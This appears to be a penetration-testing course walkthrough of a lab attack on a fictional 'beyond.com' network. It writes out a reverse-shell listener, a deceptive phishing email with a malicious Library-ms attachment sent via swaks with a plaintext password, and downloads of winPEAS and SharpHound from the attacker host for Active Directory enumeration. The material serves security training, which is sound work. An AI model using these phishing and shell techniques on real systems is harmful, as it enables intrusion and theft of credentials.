### Preparing the Environment

1. **Copy Powercat Script:**
   ```bash
   kali@kali:~/beyond$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
   ```

2. **Start Python3 Web Server:**
   ```bash
   kali@kali:~/beyond$ python3 -m http.server 8000
   Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
   ```
   - **Listing 901:** The `powercat.ps1` script is now being served on port 8000 via the Python3 web server.

3. **Set Up Netcat Listener:**
   ```bash
   kali@kali:~/beyond$ nc -nvlp 4444
   listening on [any] 4444 ...
   ```
   - **Listing 902:** A Netcat listener is set up on port 4444 to catch the incoming reverse shell from PowerCat.

### Creating and Sending the Email

1. **Prepare the Email Body:**
   - Create a file named `body.txt` in `/home/kali/beyond` with the following content:
     ```plaintext
     Hey!

     I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

     On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

     John
     ```

2. **Build and Send the Email:**
   - Use the `swaks` command-line SMTP test tool to send the email:
     ```bash
     kali@kali:~/beyond$ sudo swaks -t PI:EMAIL -t PI:EMAIL --from PI:EMAIL --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
     Username: john
     Password: dqsTwTpZPn#nL
     === Trying 192.168.50.242:25...
     === Connected to 192.168.50.242.
     EHLO kali
     AUTH LOGIN
     am9obg==
     ZHFzVHdUcFpQbiNuTA==
     MAIL FROM:
     RCPT TO:
     DATA
     36 lines sent
     QUIT
     ```
   - **Listing 904:** An incoming reverse shell on port 4444 indicates that the client-side attack via email was successful.

### Verifying the Foothold

1. **Check Basic Information:**
   ```powershell
   PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
   beyond\marcus
   PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
   CLIENTWK1
   PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
   Windows IP Configuration
   Ethernet adapter Ethernet0:
       Connection-specific DNS Suffix . :
       IPv4 Address. . . . . . . . . . . : 172.16.6.243
       Subnet Mask . . . . . . . . . . . : 255.255.255.0
       Default Gateway . . . . . . . . . : 172.16.6.254
   ```
   - **Listing 905:** We have obtained an initial foothold on the `CLIENTWK1` system as the domain user `marcus` with the IP address `172.16.6.243`.

### Enumerating the Internal Network

#### 24.4 Enumerating the Internal Network

**Learning Objectives:**
- Gain situational awareness in a network.
- Enumerate hosts, services, and sessions in a target network.
- Identify attack vectors in a target network.

#### 24.4.1 Situational Awareness

1. **Local Enumeration:**
   - Copy the 64-bit `winPEAS` executable to the directory served by the Python3 web server.
   - On `CLIENTWK1`, change the current directory to the home directory for `marcus` and download `winPEAS`:
     ```powershell
     PS C:\Windows\System32\WindowsPowerShell\v1.0> cd C:\Users\marcus
     PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
     PS C:\Users\marcus> .\winPEAS.exe
     ```
   - **Listing 906:** Downloading and executing `winPEAS`.

2. **Reviewing `winPEAS` Results:**
   - **Basic System Information:**
     ```plaintext
     Hostname: CLIENTWK1
     Domain Name: beyond.com
     ProductName: Windows 10 Pro
     EditionID: Professional
     ```
   - **Operating System Information:**
     ```powershell
     PS C:\Users\marcus> systeminfo
     Host Name: CLIENTWK1
     OS Name: Microsoft Windows 11 Pro
     OS Version: 10.0.22000 N/A Build 22000
     ```
   - **AV Information:**
     ```plaintext
     No AV was detected!!
     Not Found
     ```
   - **Network Information:**
     ```plaintext
     Ethernet0[00:50:56:8A:0F:27]: 172.16.6.243 / 255.255.255.0
     Gateways: 172.16.6.254
     DNSs: 172.16.6.240
     Known hosts:
     169.254.255.255 00-00-00-00-00-00 Invalid
     172.16.6.240 00-50-56-8A-08-34 Dynamic
     172.16.6.254 00-50-56-8A-DA-71 Dynamic
     172.16.6.255 FF-FF-FF-FF-FF-FF Static
     DNS cached --limit 70--
     Entry Name Data
     dcsrv1.beyond.com DCSRV1.beyond.com 172.16.6.240
     mailsrv1.beyond.com mailsrv1.beyond.com 172.16.6.254
     ```
   - **Listing 911:** Document identified internal machines and additional information in `computer.txt`:
     ```plaintext
     172.16.6.240 - DCSRV1.BEYOND.COM
     -> Domain Controller
     172.16.6.254 - MAILSRV1.BEYOND.COM
     -> Mail Server
     -> Dual Homed Host (External IP: 192.168.50.242)
     172.16.6.243 - CLIENTWK1.BEYOND.COM
     -> User _marcus_ fetches emails on this machine
     ```

3. **Active Directory Enumeration:**
   - Copy the PowerShell collector `SharpHound.ps1` to the `beyond` directory:
     ```bash
     kali@kali:~/beyond$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
     ```
   - Download and import the PowerShell BloodHound collector on the target machine:
     ```powershell
     PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
     PS C:\Users\marcus> powershell -ep bypass
     PS C:\Users\marcus> . .\SharpHound.ps1
     ```
   - Execute `Invoke-BloodHound` with all collection methods:
     ```powershell
     PS C:\Users\marcus> Invoke-BloodHound -CollectionMethod All
     2022-10-10T07:24:34.3593616-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
     ```

### Conclusion

- We have successfully set up the necessary services and files, sent a phishing email, and obtained an initial foothold on the `CLIENTWK1` system.
- We performed local enumeration using `winPEAS` and documented the findings.
- We are now ready to enumerate the Active Directory environment using BloodHound and the `SharpHound` collector.